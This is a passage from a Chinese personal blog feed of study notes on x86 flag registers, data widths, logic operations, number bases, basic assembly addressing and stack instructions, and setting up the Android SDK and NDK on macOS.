    <content type="html"><![CDATA[<h1 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h1><h2 id="部分标志寄存器详细介绍"><a href="#部分标志寄存器详细介绍" class="headerlink" title="部分标志寄存器详细介绍"></a>部分标志寄存器详细介绍</h2><p><img src="/2019/10/06/标志寄存器/images/15704423980063.jpg" srcset="/img/loading.gif" alt><br>需要先熟练记住这几个寄存器的位置和名称：<code>CF PF AF ZF SF OF</code></p><h3 id="CF"><a href="#CF" class="headerlink" title="CF"></a>CF</h3><p>进位标志CF(Carry Flag):如果运算结果的<strong>最高位</strong>产生了一个进位或借位，那么，其值为1，否则其值为0。</p><p>解析：在看运算结果的时候，先提前确定好参与运算的数是<strong>有无符号数</strong>和<strong>它们的数据宽度</strong>。其与PF的难辨难分，重点是看参与运算的数是否为无符号数，这个是程序员写代码的时候定义的。默认都是有符号的，这就主要看后面的PF了。</p><h3 id="PF"><a href="#PF" class="headerlink" title="PF"></a>PF</h3><p>奇偶标志PF(Parity Flag)：PF标志位，根据结果中<strong>最低有效字节(最低8位)</strong>中“1”的个数来确定置1还是清0。如果“1”的个数为偶数，则PF的值为1，否则其值为0。</p><p>解析：这个在很多教材中是错的，这个需要强调根据的是运算结果的最低有效字节，也就是最低8位里面1的个数。</p><h3 id="AF"><a href="#AF" class="headerlink" title="AF"></a>AF</h3><p>辅助进位标志AF(Auxiliary Carry Flag)：<br>如果在“加”操作期间从低半字节（最低四位）到高半字节（高四位）有进位，或者在减法期间的低8位部分从高半字节到低半字节有借位，则将辅助标志设置为（1）。否则，如果不发生这种进位或借位，则清除标志或将其“复位”（设置为0）。<strong>—-（维基百科）</strong></p><p>辅助迸位标志:算数操作結果的第三位〈从0幵始计数〉如果发生了迸位或者借位則將其置为1,否則为0,常在BCD(binary-codedecimal)算木迄算中被使用。<strong>—（百度百科）</strong></p><p>解析：这个还是在很多资料上是错误的，在x86汇编上正确解释如上，也就是<strong>在D0-D7中，D3向D4位进位或者借位，才会置1。</strong>（这个当初老师讲错、百度高赞也是错的，要注意一下）。</p><h3 id="ZF"><a href="#ZF" class="headerlink" title="ZF"></a>ZF</h3><p>零标志ZF(Zero Flag)：零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位。<br>解析：引一下常用的<code>xor r8/16/32,r8/16/32</code>对寄存器清零操作。</p><h3 id="SF"><a href="#SF" class="headerlink" title="SF"></a>SF</h3><p>符号标志SF(Sign Flag)：符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。</p><p>解析：还是需要确定数据宽度，看好到底哪个是最高位，然后把<strong>它换成2进制</strong>确定最高位是0还是1.<br>例子：</p><pre><code>MOV AL,20MOV CX,8000ADD AX,CX</code></pre><p><img src="/2019/10/06/标志寄存器/images/15704627287517.jpg" srcset="/img/loading.gif" alt="-w117"><br>这个就是在字上操作，然后相加结果是<code>8020</code>,最高位就是<code>1000</code>，那这个SF就是1了。要注意一下这个sf标志也是看数据宽度的。</p><h3 id="OF"><a href="#OF" class="headerlink" title="OF"></a>OF</h3><p>溢出标志OF(Overflow Flag)：溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0。</p><p>解析：这个常与CF混淆，以为他们没啥区别，但是这个才是正宗的计算机看是否溢出的标志位。</p><p>CF与SF区别：</p><ul><li>进位标志表示<strong>无符号数</strong>运算结果是否超出范围.</li><li>溢出标志表示<strong>有符号数</strong>运算结果是否超出范围.</li></ul><p>溢出主要是给<strong>有符号运算</strong>使用的，在有符号的运算中，有如下的规律：</p><ul><li>正 + 正 = 正 如果结果是负数，则说明有溢出</li><li>负 + 负 = 负 如果结果是正数，则说明有溢出</li><li>正 + 负 永远都不会有溢出.<br><img src="/2019/10/06/标志寄存器/images/15704444932243.jpg" srcset="/img/loading.gif" alt="-w315"><br>结合这个图在应为对PF的判断，非常好用。<strong>判断的时候，一定注意PF是在有符号数做运算的时候去看的，无符号直接看CF就好了。</strong></li></ul><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="写汇编指令只影响CF位的值"><a href="#写汇编指令只影响CF位的值" class="headerlink" title="写汇编指令只影响CF位的值"></a>写汇编指令只影响CF位的值</h3><pre><code>MOV AL,0FEADD AL,10</code></pre><p><img src="/2019/10/06/标志寄存器/images/15703705840520.jpg" srcset="/img/loading.gif" alt="-w669"></p><h3 id="写汇编指令只影响PF位的值"><a href="#写汇编指令只影响PF位的值" class="headerlink" title="写汇编指令只影响PF位的值"></a>写汇编指令只影响PF位的值</h3><pre><code>MOV AL,1ADD AL,2</code></pre><p><img src="/2019/10/06/标志寄存器/images/15703707829255.jpg" srcset="/img/loading.gif" alt="-w630"></p><h3 id="写汇编指令只影响AF位的值"><a href="#写汇编指令只影响AF位的值" class="headerlink" title="写汇编指令只影响AF位的值"></a>写汇编指令只影响AF位的值</h3><pre><code>MOV EAX,0FADD EAX,1</code></pre><p><img src="/2019/10/06/标志寄存器/images/15703770643896.jpg" srcset="/img/loading.gif" alt="-w588"></p><h3 id="写汇编指令只影响SF位的值"><a href="#写汇编指令只影响SF位的值" class="headerlink" title="写汇编指令只影响SF位的值"></a>写汇编指令只影响SF位的值</h3><pre><code>MOV CL,0F1ADD CL,1</code></pre><p><img src="/2019/10/06/标志寄存器/images/15703773573324.jpg" srcset="/img/loading.gif" alt="-w716"></p><h3 id="写汇编指令只影响OF位的值"><a href="#写汇编指令只影响OF位的值" class="headerlink" title="写汇编指令只影响OF位的值"></a>写汇编指令只影响OF位的值</h3><pre><code>MOV AL,80SUB AL,10 </code></pre><p>这个需要重视下，练习的时候有点受思维限制了。没有想到用SUB来构造出，<strong>站在80的位置顺时针查10，负-正=正</strong>，来实现溢出完成只影响OF位。</p>]]></content>
    
    
    
    <tags>
      
      <tag>c与汇编</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据宽度与逻辑运算</title>
    <link href="/2019/10/01/%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E4%B8%8E%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97/"/>
    <url>/2019/10/01/%E6%95%B0%E6%8D%AE%E5%AE%BD%E5%BA%A6%E4%B8%8E%E9%80%BB%E8%BE%91%E8%BF%90%E7%AE%97/</url>
    
    <content type="html"><![CDATA[<h1 id="数据宽度与逻辑运算"><a href="#数据宽度与逻辑运算" class="headerlink" title="数据宽度与逻辑运算"></a>数据宽度与逻辑运算</h1><h2 id="数据宽度"><a href="#数据宽度" class="headerlink" title="数据宽度"></a>数据宽度</h2><p>数学上的数字，是没有大小限制的，可以无限的大。但在计算机中，由于受硬件的制约，数据都是有长度限制的（我们称为数据宽度），超过最多宽度的数据会被丢弃。</p><h3 id="对数据宽度的理解和有无符号数"><a href="#对数据宽度的理解和有无符号数" class="headerlink" title="对数据宽度的理解和有无符号数"></a>对数据宽度的理解和有无符号数</h3><h4 id="4位宽度表示"><a href="#4位宽度表示" class="headerlink" title="4位宽度表示"></a>4位宽度表示</h4><p>4位宽度表示：假设计算机只能存储4位2进制数：</p><table><thead><tr><th align="center">0000</th><th align="center">0001</th><th align="center">0010</th><th align="center">0011</th><th align="center">0100</th><th align="center">0101</th><th align="center">0110</th><th align="center">0111</th><th align="center">1000</th><th align="center">1001</th><th align="center">1010</th><th align="center">1011</th><th align="center">1100</th><th align="center">1101</th><th align="center">1110</th><th align="center">1111</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">1</td><td align="center">2</td><td align="center">3</td><td align="center">4</td><td align="center">5</td><td align="center">6</td><td align="center">7</td><td align="center">8</td><td align="center">9</td><td align="center">A</td><td align="center">B</td><td align="center">C</td><td align="center">D</td><td align="center">E</td><td align="center">F</td></tr></tbody></table><p><img src="/2019/10/01/数据宽度与逻辑运算/images/15699374653790.jpg" srcset="/img/loading.gif" alt="-w303"><br>存无符号数时：<code>0 1 2 3 4 5 6 7 8 9 A B C D E F</code><br>存有符号数时：<br>    正数：<code>0 1 2 3 4 5 6 7</code><br>    负数：<code>-1 -2 -3 -4 -5 -6 -7 -8</code><br>    其中对应关系：</p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th></tr></thead><tbody><tr><td>F</td><td>E</td><td>D</td><td>C</td><td>B</td><td>A</td><td>9</td><td>8</td></tr></tbody></table><p>无符号数时：从0到F逆时针依次增大。</p><p>有符号数时：含义从圆中间劈开，正数负数各一半，在F处为最大负数，0处为最小的正数。</p><h5 id="为什么在存有符号数时说开头为1的数就是负数？"><a href="#为什么在存有符号数时说开头为1的数就是负数？" class="headerlink" title="为什么在存有符号数时说开头为1的数就是负数？"></a>为什么在存有符号数时说开头为1的数就是负数？</h5><p>我们只看二进制：<br>| 0  | 1 | 2 | 3 | 4 | 5 | 6 | 7 |<br>| — | — | — | — | — | — | — | — | —  |<br>| 0000 | 0001 | 0010 | 0011 | 0100 | 0101 | 0110 | 0111 |</p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th></tr></thead><tbody><tr><td>1111</td><td>1110</td><td>1101</td><td>1100</td><td>1011</td><td>1010</td><td>1001</td><td>1000</td></tr><tr><td>很明显就可以看出，当二进制开头为1的时候对应存的数值就是负数了。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><strong>举例：对1011的理解</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1011在我们当做是有符号时就是-5，无符号就是B。<strong>这个完全看我们如何去定义。</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>#### 8位宽度：</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>8位宽度表示：假设计算机只能存储8位2进制数。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td><img src="/2019/10/01/数据宽度与逻辑运算/images/15699387217727.jpg" srcset="/img/loading.gif" alt="-w315"></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>无符号数：0 1 2 3 4 ……FF</p><p>有符号数：<br>正数：0 1 2 3 4 5 6 7 …7F<br>负数： </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>….</th><th>-128</th></tr></thead><tbody><tr><td>FF</td><td>FE</td><td>FD</td><td>FC</td><td>FB</td><td>FA</td><td>F9</td><td>F8</td><td>….</td><td>80</td></tr></tbody></table><h4 id="16位宽度"><a href="#16位宽度" class="headerlink" title="16位宽度"></a>16位宽度</h4><p>16位宽度表示：假设计算机只能存储16位2进制数<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699389940266.jpg" srcset="/img/loading.gif" alt="-w317"><br>无符号数：0 1 2 3 4 ……FFFF</p><p>有符号数：<br>正数：0 1 2 3 4 5 6 7 …7FFF<br>负数： </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>….</th><th>-128</th></tr></thead><tbody><tr><td>FFFF</td><td>FFFE</td><td>FFFD</td><td>FFFC</td><td>FFFB</td><td>FFFA</td><td>FFF9</td><td>FFF8</td><td>….</td><td>8000</td></tr></tbody></table><h4 id="32位宽度"><a href="#32位宽度" class="headerlink" title="32位宽度"></a>32位宽度</h4><p>32位宽度表示：假设计算机只能存储32位2进制数<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699391219590.jpg" srcset="/img/loading.gif" alt="-w378"><br>无符号数：0 1 2 3 4 ……FFFFFFFF</p><p>有符号数：<br>正数：0 1 2 3 4 5 6 7 …7FFFFFFF<br>负数： </p><table><thead><tr><th>-1</th><th>-2</th><th>-3</th><th>-4</th><th>-5</th><th>-6</th><th>-7</th><th>-8</th><th>….</th><th>-128</th></tr></thead><tbody><tr><td>FFFFFFFF</td><td>FFFFFFFE</td><td>FFFFFFFD</td><td>FFFFFFFC</td><td>FFFFFFFB</td><td>FFFFFFFA</td><td>FFFFFFF9</td><td>FFFFFFF8</td><td>….</td><td>80000000</td></tr><tr><td>### 几个本质问题</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>1：计算机除了0和1什么也不认识。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>2：如果存的数据超过数据长度限制，超过的会直接抛弃。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>3：有符号数和无符号数是我们自己用的时候定义的，定义是什么就是什么。</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>### 几个重要的计量单位：</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>BYTE  字节  8BIT</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>WORD  字   16BIT 2字节</p><p>DWORD 双字 32BIT 4字节</p><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><h3 id="二进制的逻辑运算："><a href="#二进制的逻辑运算：" class="headerlink" title="二进制的逻辑运算："></a>二进制的逻辑运算：</h3><h4 id="or："><a href="#or：" class="headerlink" title="or："></a>or：</h4><p>或(or |)  只要有一个为1就是1<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699395390213.jpg" srcset="/img/loading.gif" alt="-w915"></p><h4 id="and："><a href="#and：" class="headerlink" title="and："></a>and：</h4><p>与(and &amp;)两个都为1才是1<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699396122732.jpg" srcset="/img/loading.gif" alt="-w871"></p><h4 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h4><p>异或（xor) 不一样为1<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699397540402.jpg" srcset="/img/loading.gif" alt="-w928"><br>ps：错位了。。。</p><h4 id="not"><a href="#not" class="headerlink" title="not"></a>not</h4><p>非(not !) 1是0 0是1<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15699398562544.jpg" srcset="/img/loading.gif" alt="-w255"></p><h3 id="逻辑运算的具体应用："><a href="#逻辑运算的具体应用：" class="headerlink" title="逻辑运算的具体应用："></a>逻辑运算的具体应用：</h3><h4 id="想获取某个值得第N位的值是1还是0"><a href="#想获取某个值得第N位的值是1还是0" class="headerlink" title="想获取某个值得第N位的值是1还是0"></a>想获取某个值得第N位的值是1还是0</h4><p>如：8F<br>        <img src="/2019/10/01/数据宽度与逻辑运算/images/15700250078922.jpg" srcset="/img/loading.gif" alt="-w135"><br><strong>方法</strong>：想看下第四位是0还是1，就写个第四个位为1其他都为0的数，然后进行一个与运算，如果出来结果是1.那就证明第四位就是1。</p><h4 id="最简单的加密算法："><a href="#最简单的加密算法：" class="headerlink" title="最简单的加密算法："></a>最简单的加密算法：</h4><p>如：<br>要加密的数据：2015<br>密钥：54<br>因为密钥是两位的，所以要对2015分为<code>20</code>和<code>15</code>。<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15701063449646.jpg" srcset="/img/loading.gif" alt="-w279"><br>进行一次xor运算，出来就是加密后的值：<code>74</code> <code>41</code><br>当用他俩再进行一次xor运算：<br><img src="/2019/10/01/数据宽度与逻辑运算/images/15701064241084.jpg" srcset="/img/loading.gif" alt="-w253"><br>就又变成了2015。这就完成了加密解密。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>进制学习</title>
    <link href="/2019/09/28/%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/09/28/%E8%BF%9B%E5%88%B6%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="进制学习"><a href="#进制学习" class="headerlink" title="进制学习"></a>进制学习</h1><h2 id="进制的定义"><a href="#进制的定义" class="headerlink" title="进制的定义"></a>进制的定义</h2><p>十进制的定义:由十个符号组成，分别是<code>0 1 2 3 4 5 6 7 8 9</code>逢十进一。</p><p>九进制的定义:由九个符号组成，分别是<code>0 1 2 3 4 5 6 7 8</code>逢九进一。</p><p>十六进制的定义:由十六个符号组成，分别是<code>0 1 2 3 4 5 6 7 8 9 A B C D E F</code></p><h2 id="进制的本质"><a href="#进制的本质" class="headerlink" title="进制的本质"></a>进制的本质</h2><p>例如十进制：<code>0 1 2 3 4 5 6 7 8 9</code> 其就是由10个<strong>符号</strong>组成。如果定义其为<code>9 1 5 2 4 7 6 3 8 0</code>,或者换成<img src="/2019/09/28/进制学习/images/15696440221558.jpg" srcset="/img/loading.gif" alt="-w315">,如果用上面的符号进行加密与解密，让不懂进制本质的人解密有很大的阻碍。</p><h2 id="二进制与十六进制的映射关系"><a href="#二进制与十六进制的映射关系" class="headerlink" title="二进制与十六进制的映射关系"></a>二进制与十六进制的映射关系</h2><p><img src="/2019/09/28/进制学习/images/15698464290376.jpg" srcset="/img/loading.gif" alt="-w911"><br>这个需要背会。</p><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="正常认知的进制："><a href="#正常认知的进制：" class="headerlink" title="正常认知的进制："></a>正常认知的进制：</h3><h4 id="二进制"><a href="#二进制" class="headerlink" title="二进制"></a>二进制</h4><p>从0写到100</p><p><img src="/2019/09/28/进制学习/images/15713236407261.jpg" srcset="/img/loading.gif" alt="-w900"></p><h4 id="七进制"><a href="#七进制" class="headerlink" title="七进制"></a>七进制</h4><p>编制7进制加法表，乘法表，并计算下面的结果：<strong>23456+54356=？5621-654=？234*65=？</strong><br><img src="/2019/09/28/进制学习/images/15713237049873.jpg" srcset="/img/loading.gif" alt="-w608"><br>7进制加法表：<br><img src="/2019/09/28/进制学习/images/15713237825325.jpg" srcset="/img/loading.gif" alt="-w541"><br>7进制乘法表：<br><img src="/2019/09/28/进制学习/images/15713238136767.jpg" srcset="/img/loading.gif" alt="-w537"><br>粗略计算过程：<br><img src="/2019/09/28/进制学习/images/15713245566592.jpg" srcset="/img/loading.gif" alt="-w275"><br>本质就是直接查表了。</p><h4 id="十六进制："><a href="#十六进制：" class="headerlink" title="十六进制："></a>十六进制：</h4><p>编制16进制加法表，乘法表，并计算下面的结果：2D4E6+CF3A6=？5FD1-E5A=？2CA*A5=？<br><img src="/2019/09/28/进制学习/images/15713241502952.jpg" srcset="/img/loading.gif" alt="-w1387"><br>16进制加法：<br><img src="/2019/09/28/进制学习/images/15713241702367.jpg" srcset="/img/loading.gif" alt="-w1337"><br>16进制乘法表：<br><img src="/2019/09/28/进制学习/images/15713241834458.jpg" srcset="/img/loading.gif" alt="-w1330"><br>粗略计算过程：<br><img src="/2019/09/28/进制学习/images/15713245906184.jpg" srcset="/img/loading.gif" alt="-w238"></p><p>都是查表。</p><h3 id="面向本质的非认知进制："><a href="#面向本质的非认知进制：" class="headerlink" title="面向本质的非认知进制："></a>面向本质的非认知进制：</h3><h4 id="一："><a href="#一：" class="headerlink" title="一："></a>一：</h4><p><strong>9进制定义：由9个符号组成，分别是：2、9、1、7、6、5、4、8、3，逢9进1</strong></p><p><strong>计算：123 + 234 = ?</strong></p><p>先画个进制表：<br><img src="/2019/09/28/进制学习/images/15699252652163.jpg" srcset="/img/loading.gif" alt="-w489"><br>然后计算：<br><img src="/2019/09/28/进制学习/images/15699253052200.jpg" srcset="/img/loading.gif" alt="-w154"></p><p><strong>解题过程:</strong><br>1)最后一位3+4中的4是第6个数，所以3+4 可以看成从3向后数6个为95，取最后一个5且有一个进位<br>2)最后第二位2+3中的2是第0个数，所以2+3相当3，有一个进位，需要再向后查一个是92，取最后一位2且进1位<br>3)第一位1+2中的2是第0个数，所以1+2相当于1，有一个进位，要再向后查一个，再查一位是7，所以最后是725</p><h4 id="二："><a href="#二：" class="headerlink" title="二："></a>二：</h4><p><strong>10进制定义：由10个符号组成，分别是：!、@、$、%、^、&amp;、*、A、B、C，逢10进1</strong></p><p>计算：@$$B + %AC&amp; = ? </p><p>先画个进制表：<br><img src="/2019/09/28/进制学习/images/15699343877953.jpg" srcset="/img/loading.gif" alt="-w583"><br>然后计算：<br><img src="/2019/09/28/进制学习/images/15699344047423.jpg" srcset="/img/loading.gif" alt="-w185"></p><p><strong>解题过程：</strong><br>1)最后一位<code>B+&amp;</code>中的<code>&amp;</code>是第5个数，所以<code>B+&amp;</code>可以看成从B向后数5个为<code>@%</code>，取最后一个<code>%</code>且有一个进位<br>2)最后第二位<code>$+C</code>中的C是第9个数，所以<code>$+C</code>相当从<code>$</code>开始查9个数，前面有一个进位，需要再向后查一个是<code>@$</code>，取最后一位<code>$</code>且进1位<br>3)最后第三位<code>$+A</code>中的A是第7个数，所以<code>$+A</code>相当于从<code>$</code>开始往后查7个，有一个进位，要再向后查一个，再查一位是<code>@!</code>，所以最后是<code>!</code>且进一位<br>4)第一位的<code>@+%</code>中的@是第一个数，所以<code>@+%</code>相当于从<code>%</code>在往后查一位，因为有个进位所以再往后查一位就是<code>&amp;</code>。所以答案就是<code>&amp;!$%</code>。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>经过这次对进制的学习和练习，对进制理解更加的深刻，<strong>它们只是一堆符号</strong>，在达到某个程度后会进位罢了。在复习到c后，有时间可以学习一下写个进制加密的程序。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>逆向学习-滴水公开课</title>
    <link href="/2019/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E6%BB%B4%E6%B0%B4%E5%85%AC%E5%BC%80%E8%AF%BE/"/>
    <url>/2019/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-%E6%BB%B4%E6%B0%B4%E5%85%AC%E5%BC%80%E8%AF%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="逆向学习-滴水公开课知识总结"><a href="#逆向学习-滴水公开课知识总结" class="headerlink" title="逆向学习-滴水公开课知识总结"></a>逆向学习-滴水公开课知识总结</h1><h3 id="一、内存的读写"><a href="#一、内存的读写" class="headerlink" title="一、内存的读写"></a>一、内存的读写</h3><h4 id="寻址公式一-立即数"><a href="#寻址公式一-立即数" class="headerlink" title="寻址公式一: [立即数]"></a>寻址公式一: [立即数]</h4><p>读取内存的值:<br>    <code>MOV EAX,DWORD PTR DS:[0x13FFC4]    MOV EAX,DYVORD PTR DS:[0x13FFC8]</code><br>    向内存中写入数据:<br>    <code>MOV DWORD PTR DS:[0x13FFC4],eax    MOV DWORD PTR DS:[0x13FFC8].ebx</code><br>    获取内存编号:<br>  <code>LEA EAX,DWORD PTR DS:[0X13FFC4]    LEA EAX,DWORD PTR DS:[ESP+8]</code></p><h4 id="寻址公式二-reg-reg代表寄存器可以是8个通用寄存器中的任意一个"><a href="#寻址公式二-reg-reg代表寄存器可以是8个通用寄存器中的任意一个" class="headerlink" title="寻址公式二: [reg] reg代表寄存器可以是8个通用寄存器中的任意一个"></a>寻址公式二: [reg] reg代表寄存器可以是8个通用寄存器中的任意一个</h4><p>读取内存的值:<br><code>MOV ECX,0x13FFD0MOV EAX,DWORD PTR DS:[ECX]</code></p><p>向内存中写入数据:<br><code>MOV EDX,0x13FFD8MOV DWORD PTR DS:[EDX],0x87654321</code></p><p>获取内存编号:<br><code>LEA EAX,DWORD PTR DS:[EDX]MOV EAX,DWORD PTR DS:[EDX]</code></p><h4 id="寻址公式三-reg-立即数"><a href="#寻址公式三-reg-立即数" class="headerlink" title="寻址公式三: [reg+立即数]"></a>寻址公式三: [reg+立即数]</h4><p>读取内存的值:<br><code>MOV ECX,0x13FFD0MOV EAX,DWORD PTR DS:[ECX+4]</code></p><p>向内存中写入数据:<br><code>MOV EDX,0x13FFD8MOV DWORD PTR DS:[EDX+0xC].0x87654321</code></p><p>获取内存编号:<br><code>LEA EAX,DWORD PTR DS:[EDX+4]MOV EAX,DWORD PTR DS:[EDX+4]</code></p><h4 id="寻址公式四：-reg-reg-（1-or-2-or-4-or-8）"><a href="#寻址公式四：-reg-reg-（1-or-2-or-4-or-8）" class="headerlink" title="寻址公式四：[reg+reg*（1 or 2 or 4 or 8）]"></a>寻址公式四：[reg+reg*（1 or 2 or 4 or 8）]</h4><p>读取内存的值:<br><code>MOV EAX,13FFC4MOV ECX,2MOV EDX,DWORD PTR DS:[EAX+ECX*4]</code></p><p>向内存中写入数据:<br><code>MOV EAX,13FFC4MOV ECX,2MOV DWORD PTR DS:[EAX+ECX*4],0x87654321</code></p><p>获取内存编号:<br><code>LEA EAX,DWORD PTR DS:[EAX+ECX*4]</code></p><h4 id="寻址公式五：-reg-reg-（1-or-2-or-4-or-8）-立即数"><a href="#寻址公式五：-reg-reg-（1-or-2-or-4-or-8）-立即数" class="headerlink" title="寻址公式五：[reg+reg*（1 or 2 or 4 or 8）+立即数]"></a>寻址公式五：[reg+reg*（1 or 2 or 4 or 8）+立即数]</h4><p>读取内存的值:<br><code>MOV EAX,13FFC4MOV ECX,2MOV EDX,DWORD PTR DS:[EAX+ECX*4+4]</code></p><p>向内存中写入数据:<br><code>MOV EAX,13FFC4MOV ECX,2MOV DWORD PTR DS:[EAX+ECX*4+4],0x87654321</code></p><p>获取内存编号:<br><code>LEA EAX,DWORD PTR DS:[EAX+ECX*4+2]</code></p><h3 id="二、堆栈"><a href="#二、堆栈" class="headerlink" title="二、堆栈"></a>二、堆栈</h3><h4 id="变形的艺术"><a href="#变形的艺术" class="headerlink" title="变形的艺术:"></a>变形的艺术:</h4><h5 id="push-eax代码相当于"><a href="#push-eax代码相当于" class="headerlink" title="push eax代码相当于:"></a>push eax代码相当于:</h5><p><code>lea esp,dword ptr ss:[esp-4]mov dword ptr ss:[esp],eax或者mov dword ptr ss:[esp-4],eaxlea esp,dword ptr ss:[esp-4]还有sub esp,0x4mov dword ptr ss:[esp],eax</code></p><h5 id="push-esp代码相当于："><a href="#push-esp代码相当于：" class="headerlink" title="push esp代码相当于："></a>push esp代码相当于：</h5><p><code>mov dword ptr [esp-4],esp sub esp,0x4</code><br> 还有：</p><p> <code>mov dword ptr [esp-4],esp  lea esp,dword ptr [esp-4]</code></p><h5 id="pop-eax-代码相当于："><a href="#pop-eax-代码相当于：" class="headerlink" title="pop eax 代码相当于："></a>pop eax 代码相当于：</h5><p><code>lea esp,dword ptr [esp+4] mov eax,dword ptr [esp-4]</code></p><p><code>mov eax,dword ptr [esp] lea esp,dword ptr [esp+4]</code></p><h5 id="pop-esp-代码相当于："><a href="#pop-esp-代码相当于：" class="headerlink" title="pop esp 代码相当于："></a>pop esp 代码相当于：</h5><p><code>add esp,0x4 mov esp,dword ptr[esp-4]</code><br>或者</p><p><code>lea esp,dword ptr[esp+4] mov esp,dword ptr[esp-4]</code></p><h4 id="两条简单指令"><a href="#两条简单指令" class="headerlink" title="两条简单指令"></a>两条简单指令</h4><p>stos ：将eax中的值放入edi所指地址的内存里。</p><p>rep ：是重复指令 ecx中放入重复的次数</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>安卓程序分析环境搭建</title>
    <link href="/2019/09/23/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2019/09/23/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>#安卓程序分析环境搭建</p><h2 id="Mac下安卓SDK搭建："><a href="#Mac下安卓SDK搭建：" class="headerlink" title="Mac下安卓SDK搭建："></a>Mac下安卓SDK搭建：</h2><p>前提是已经安装了<strong>homebrew</strong>神器：</p><h3 id="1：下载SDK"><a href="#1：下载SDK" class="headerlink" title="1：下载SDK"></a>1：下载SDK</h3><pre><code>brew search android-sdkbrew cask install android-sdk</code></pre><h3 id="2：配置环境变量"><a href="#2：配置环境变量" class="headerlink" title="2：配置环境变量"></a>2：配置环境变量</h3><pre><code>vim .zshrcexport ANDROID_SDK_ROOT=&quot;/usr/local/share/android-sdk&quot;export PATH=&quot;${PATH}:${ANDROID_SDK_ROOT}/tools:${ANDROID_SDK_ROOT}/platform-tools&quot;</code></pre><p><code>!wq</code>退出以后，<code>source ~/.zshrc</code></p><pre><code>pwd/usr/local/share/android-sdk/tools/bin./sdkmanager</code></pre><p>然后会出现<code>Warning: File /Users/gjy/.android/repositories.cfg could not be loaded.</code><br>继续<code>touch /Users/gjy/.android/repositories.cfg</code></p><h3 id="3：检验是否搭建好"><a href="#3：检验是否搭建好" class="headerlink" title="3：检验是否搭建好"></a>3：检验是否搭建好</h3><p>在终端输入：<code>android</code><br><img src="/2019/09/23/安卓程序分析环境搭建/images/15692314399452.jpg" srcset="/img/loading.gif" alt="-w706"><br>这就ok了。</p><h2 id="安卓NDK搭建"><a href="#安卓NDK搭建" class="headerlink" title="安卓NDK搭建"></a>安卓NDK搭建</h2><p>前提是已经安装了<strong>homebrew</strong>神器：</p><h3 id="1：下载NDK："><a href="#1：下载NDK：" class="headerlink" title="1：下载NDK："></a>1：下载NDK：</h3><pre><code>brew search android-ndkbrew cask install android-ndk</code></pre><h3 id="2：配置环境变量："><a href="#2：配置环境变量：" class="headerlink" title="2：配置环境变量："></a>2：配置环境变量：</h3><pre><code>vim .zshrcexport ANDROID_NDK_HOME=&quot;/usr/local/share/android-ndk&quot;  //添加进去正常保存退出source .zshrc</code></pre><h3 id="3：检验："><a href="#3：检验：" class="headerlink" title="3：检验："></a>3：检验：</h3><p><code>ndk-build</code><br><img 